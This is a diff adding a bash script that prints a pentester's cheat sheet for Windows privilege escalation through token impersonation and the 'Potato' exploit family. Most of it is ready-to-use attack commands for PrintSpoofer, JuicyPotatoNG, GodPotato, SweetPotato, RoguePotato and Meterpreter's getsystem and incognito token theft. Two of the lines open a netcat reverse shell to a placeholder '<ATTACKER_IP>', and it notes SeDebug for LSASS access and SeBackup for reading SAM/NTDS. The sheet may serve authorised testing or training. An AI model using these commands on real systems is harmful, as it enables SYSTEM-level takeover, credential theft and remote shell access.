@@ -1,0 +1,63 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── TOKEN IMPERSONATION & POTATO ATTACKS ──────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Required Privileges ──────────────────────────────${NC}"
+echo -e "  ${BLUE}SeImpersonatePrivilege${NC}   # service accounts (IIS, MSSQL, LocalService)"
+echo -e "  ${BLUE}SeAssignPrimaryToken${NC}     # alternate for impersonation"
+echo -e "  ${BLUE}SeBackupPrivilege${NC}        # read any file (SAM/NTDS)"
+echo -e "  ${BLUE}SeLoadDriver${NC}             # load kernel driver (Capcom, CapcomPwn)"
+echo -e "  ${BLUE}SeDebug${NC}                  # access LSASS / inject into privileged processes"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PrintSpoofer ─────────────────────────────────────${NC}"
+echo -e "  ${GREEN}.\\PrintSpoofer64.exe -i -c powershell.exe${NC}        # interactive PS"
+echo -e "  ${GREEN}.\\PrintSpoofer64.exe -i -c cmd.exe${NC}               # interactive cmd"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── JuicyPotatoNG ────────────────────────────────────${NC}"
+echo -e "  ${GREEN}.\\JuicyPotatoNG.exe -t * -p 'C:\Windows\System32\cmd.exe' -a '/c <cmd>'${NC}"
+echo -e "  ${GREEN}.\\JuicyPotatoNG.exe -t * -p 'C:\Windows\System32\cmd.exe' -a '/c powershell -enc <B64>'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── GodPotato ────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}.\\GodPotato.exe -cmd 'cmd /c whoami'${NC}"
+echo -e "  ${GREEN}.\\GodPotato.exe -cmd 'C:\Windows\Temp\nc.exe <ATTACKER_IP> 4444 -e cmd.exe'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── SweetPotato / RoguePotato ────────────────────────${NC}"
+echo -e "  ${GREEN}.\\SweetPotato.exe -a powershell.exe${NC}"
+echo -e "  ${GREEN}.\\RoguePotato.exe -r <ATTACKER_IP> -e 'C:\Windows\Temp\nc.exe <IP> 4444 -e cmd.exe' -l 9999${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Meterpreter getsystem ────────────────────────────${NC}"
+echo -e "  ${GREEN}getsystem -t 5${NC}                                   # PrintSpoofer technique"
+echo -e "  ${GREEN}getsystem -t 6${NC}                                   # EfsPotato technique"
+echo -e "  ${GREEN}getsystem${NC}                                        # try all methods"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Meterpreter Token Impersonation ──────────────────${NC}"
+echo -e "  ${GREEN}load incognito${NC}"
+echo -e "  ${GREEN}list_tokens -u${NC}"
+echo -e "  ${GREEN}impersonate_token 'DOMAIN\\\\admin'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Potato Family Reference ──────────────────────────${NC}"
+echo -e "  ${BLUE}JuicyPotato${NC}       # CLSID-based COM object abuse (Windows < 10 1809)"
+echo -e "  ${BLUE}JuicyPotatoNG${NC}     # Updated, works on newer OS"
+echo -e "  ${BLUE}PrintSpoofer${NC}      # SpoolSS abuse (Windows 10/Server 2019)"
+echo -e "  ${BLUE}RoguePotato${NC}       # NTLM relay via named pipe"
+echo -e "  ${BLUE}SweetPotato${NC}       # Combines multiple techniques"
+echo -e "  ${BLUE}GodPotato${NC}         # Works on Server 2012-2022 + Win 10-11"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
